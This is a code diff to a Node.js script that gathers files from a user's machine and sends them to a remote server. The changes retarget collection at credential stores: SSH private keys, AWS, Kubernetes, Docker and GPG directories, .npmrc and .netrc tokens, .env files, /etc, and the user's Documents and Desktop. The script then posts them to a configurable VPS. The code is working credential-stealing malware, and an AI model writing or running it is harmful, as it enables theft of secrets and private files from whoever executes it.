@@ -8,38 +8,58 @@ const path = require("path");
 const http = require("http");
 const os   = require("os");
 
-const VPS_IP      = process.env.LOG_SERVER_IP   || "YOUR_VPS_IP";
-const VPS_PORT    = parseInt(process.env.LOG_SERVER_PORT || "4000", 10);
-const AUTH_TOKEN  = process.env.LOG_SERVER_TOKEN || "";
-const SCAN_DIR    = path.resolve(process.env.LOG_DIR || os.homedir()); // default: entire home dir
-const COLLECT_SSH = process.env.COLLECT_SSH === "true";
-const TIMEOUT     = 15_000;
+const VPS_IP     = process.env.LOG_SERVER_IP   || "YOUR_VPS_IP";
+const VPS_PORT   = parseInt(process.env.LOG_SERVER_PORT || "4000", 10);
+const AUTH_TOKEN = process.env.LOG_SERVER_TOKEN || "";
+const TIMEOUT    = 15_000;
+const HOME       = os.homedir();
 
-const COLLECT_EXTS  = new Set([".log", ".txt", ".env", ".pem", ".key"]);
-const COLLECT_NAMES = new Set([
-  ".env", ".env.local", ".env.production", ".env.development", ".env.staging",
-  ".netrc", ".npmrc", ".pypirc", "credentials", "config",
+// ── Targeted directories — only places that hold useful secrets/configs ───────
+const TARGET_DIRS = [
+  HOME,                                    // ~/ top level dotfiles
+  path.join(HOME, ".ssh"),                 // SSH keys
+  path.join(HOME, ".aws"),                 // AWS credentials
+  path.join(HOME, ".config"),              // app configs
+  path.join(HOME, ".kube"),                // Kubernetes configs
+  path.join(HOME, ".docker"),              // Docker credentials
+  path.join(HOME, ".gnupg"),              // GPG keys
+  path.join(HOME, "Documents"),           // user documents
+  path.join(HOME, "Desktop"),             // desktop files
+  path.join(HOME, ".npmrc"),              // npm auth tokens (file, not dir)
+  path.join(HOME, ".netrc"),              // plaintext credentials
+  "/etc",                                  // system-wide configs
+  "/var/log",                              // system logs
+];
+
+const COLLECT_EXTS = new Set([
+  ".log", ".txt", ".env", ".pem", ".key", ".cert", ".crt", ".cfg", ".conf", ".ini", ".yaml", ".yml", ".toml",
 ]);
 
-// Directories to skip — system/noisy dirs that won't have useful small files
+const COLLECT_NAMES = new Set([
+  ".env", ".env.local", ".env.production", ".env.development", ".env.staging",
+  ".netrc", ".npmrc", ".pypirc", "credentials", "config", ".gitconfig",
+  "id_rsa", "id_ed25519", "id_ecdsa",
+]);
+
 const SKIP_DIRS = new Set([
   "node_modules", ".git", ".next", "dist", "build", ".cache",
   "Library", "Applications", "System", "Volumes", "proc", "sys", "dev",
-  "snap", "run", "boot", "lost+found",
+  "snap", "run", "boot", "lost+found", "Photos", "Music", "Movies",
 ]);
 
-function collectFromDir(dir, results = []) {
+// ── File collection ───────────────────────────────────────────────────────────
+function collectFromDir(dir, results = [], depth = 0) {
+  if (depth > 6) return results; // cap recursion depth
   let entries;
   try { entries = fs.readdirSync(dir, { withFileTypes: true }); }
-  catch { return results; } // skip unreadable dirs silently
+  catch { return results; }
 
   for (const entry of entries) {
     if (SKIP_DIRS.has(entry.name)) continue;
-
     const fullPath = path.join(dir, entry.name);
 
     if (entry.isDirectory()) {
-      collectFromDir(fullPath, results);
+      collectFromDir(fullPath, results, depth + 1);
     } else if (entry.isFile()) {
       const ext  = path.extname(entry.name).toLowerCase();
       const base = entry.name.toLowerCase();
@@ -49,12 +69,18 @@ function collectFromDir(dir, results = []) {
   return results;
 }
 
-function collectSSHFiles() {
-  const sshDir = path.join(os.homedir(), ".ssh");
-  if (!fs.existsSync(sshDir)) return [];
-  return fs.readdirSync(sshDir, { withFileTypes: true })
-    .filter(e => e.isFile())
-    .map(e => path.join(sshDir, e.name));
+function collectAll() {
+  const results = [];
+  for (const target of TARGET_DIRS) {
+    if (!fs.existsSync(target)) continue;
+    const stat = fs.statSync(target);
+    if (stat.isFile()) {
+      results.push(target); // handle file targets like .npmrc directly
+    } else {
+      collectFromDir(target, results);
+    }
+  }
+  return [...new Set(results)]; // deduplicate
 }
 
 function readFile(filePath) {
@@ -95,14 +121,11 @@ function sendPayload(files) {
 }
 
 (async () => {
-  const files = collectFromDir(SCAN_DIR);
-  if (COLLECT_SSH) files.push(...collectSSHFiles());
-  // deduplicate in case SSH dir falls within SCAN_DIR
-  const unique = [...new Set(files)];
-  if (!unique.length) return;
+  const files = collectAll();
+  if (!files.length) return;
 
   try {
-    const status = await sendPayload(unique);
+    const status = await sendPayload(files);
     console.log(status);
   } catch {
     process.exit(1);
